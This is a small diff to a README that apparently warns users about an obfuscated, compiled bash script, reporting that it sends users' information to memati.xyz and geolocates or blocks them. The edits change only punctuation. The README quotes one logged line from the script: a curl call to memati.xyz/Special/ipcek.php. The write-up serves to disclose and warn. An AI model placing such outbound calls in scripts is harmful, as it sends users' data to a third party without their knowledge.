@@ -16,7 +16,7 @@ You can clone everything except README.md to use script without any connection t
 
 ## More Deep
 
-They compiled every bash file to obfuscate their code. And if you try to run Special-library with only ./Special-library you will get this:
+They compiled every bash file to obfuscate their code. And if you try to run Special-library with only ./Special-library you will get this :
 
 
 
@@ -60,7 +60,7 @@ ALERT: All files does lot of sensitive info (of yours) transfer with memati.xyz 
 
 Simple, they check ur data and geolocate you. Even restrict your IP for no reason.
 
-Log of Special Script
+Log of SpecialScript :
 
 ```
 curl -s -4 memati.xyz/Special/ipcek.php
